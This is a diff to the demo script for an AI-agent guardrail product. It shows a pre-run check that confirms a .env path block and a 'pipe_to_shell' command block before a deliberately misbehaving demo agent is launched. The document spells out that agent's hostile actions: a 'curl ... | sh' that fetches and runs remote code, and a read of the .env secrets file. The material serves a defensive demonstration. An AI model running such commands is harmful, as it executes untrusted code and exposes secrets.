@@ -19,8 +19,22 @@ Target length is about 3 minutes, and both guardrails fire live. All commands ru
 3. **Inventory (15 s).** Show the dashboard inventory columns: **Agent**, **Model**, **Last activity**, **Total spend**.
 4. **Path block (60 s).** This is the demo moment.
    - Open `bad-bot`. Under **Add path**, type `.env` and click **Add path**. Under **Blocked commands**, click **Add presets** (the presets include `pipe_to_shell`). Click **Save rules**, then reload `bad-bot` and check that both `.env` and the `pipe_to_shell` pattern are listed.
-   - Safety: don't run `bad_agent.py` until both rules are saved. Its second step really runs `curl -fsSL https://example.com/setup.sh | sh` if the `pipe_to_shell` pattern is missing.
-   - In the terminal: `python demo/bad_agent.py`
+   - Safety: `bad_agent.py` must not run until both rules are saved and confirmed by a fresh read of `bad-bot`'s config. Its second step really runs `curl -fsSL https://example.com/setup.sh | sh` if the `pipe_to_shell` pattern is missing.
+   - In the terminal, run the check and the agent together. The check reads the config from the API (key hashed in-process; it prints only OK or STOP), and `bad_agent.py` starts only if it prints OK:
+     ```bash
+     python - <<'PY' && python demo/bad_agent.py
+     import hashlib, json, os, sys, requests
+     pattern = next(p["pattern"] for p in json.load(open("dashboard/lib/commandPresets.json")) if p["id"] == "pipe_to_shell")
+     r = requests.get(os.environ["AGENTWATCH_ENDPOINT"] + "/agents/bad-bot/config", timeout=10, allow_redirects=False,
+                      headers={"X-Agentwatch-Owner": os.environ["AGENTWATCH_OWNER"],
+                               "X-Agentwatch-Key-Hash": hashlib.sha256(os.environ["AGENTWATCH_KEY"].encode("utf-8")).hexdigest()})
+     g = r.json().get("guardrails", {}) if r.status_code == 200 else {}
+     ok = ".env" in g.get("blockedPaths", []) and pattern in g.get("blockedCommands", [])
+     print("OK: .env and pipe_to_shell are saved on bad-bot" if ok else f"STOP: rules not confirmed (HTTP {r.status_code}); bad_agent.py was not run")
+     sys.exit(0 if ok else 1)
+     PY
+     ```
+   - If it prints STOP, `bad_agent.py` does not start. Add the missing rule, click **Save rules**, and run the block again.
    - Expected: the agent answers one question, says it will check the `.env` file, then prints `PathBlocked: ... (Agent Watch stopped the read; an alert is on its way)`. The file is never opened. Then it says it will install a helper and prints `CommandBlocked: ... (Agent Watch stopped the command; an alert is on its way)`. The command never runs.
    - Switch to the inbox and show the two alert emails, subjects `Agent Watch: blocked_path blocked for bad-bot` and `Agent Watch: blocked_command blocked for bad-bot`.
    - Back in the dashboard, refresh `bad-bot`. The timeline shows the two `blocked` events at the top.
@@ -36,7 +50,8 @@ Target length is about 3 minutes, and both guardrails fire live. All commands ru
 - `read_file('.env') was NOT blocked`: the rule wasn't saved, or the SDK hasn't fetched it yet. Config is fetched at `init`, so check **Save rules** succeeded and rerun.
 - `run 1/5: SpendCapExceeded` immediately: the cap is below the current 24h spend plus about $0.001. Raise it and rerun.
 - No block after 5 runs: the cap is too high. Lower it.
-- `run_shell was NOT blocked`: the `pipe_to_shell` pattern wasn't saved, and the command actually ran. Stop, add the pattern with **Add presets**, click **Save rules**, reload `bad-bot` to confirm it's listed, then rerun.
+- `STOP: rules not confirmed`: the check found `.env` or the `pipe_to_shell` pattern missing on `bad-bot` (or the request failed), so `bad_agent.py` did not run. Add the rule, click **Save rules**, and run the block again.
+- `run_shell was NOT blocked`: only possible if `bad_agent.py` was started without the check. The command actually ran. Stop, add the pattern with **Add presets**, click **Save rules**, and use the check before the next run.
 - `Bedrock unavailable (...); falling back to Anthropic API` from `bad_agent.py` or `demo_agent.py`: fine, both fall back the same way and the demo still works if `ANTHROPIC_API_KEY` is set. With neither working, the agent stops at its first LLM call.
 - No email: check spam, and check that the SNS subscription was confirmed. The block itself still happened, so show it in the timeline.
 - `agentwatch: authorization failed`: wrong `AGENTWATCH_OWNER` or `AGENTWATCH_KEY` for that agent id.
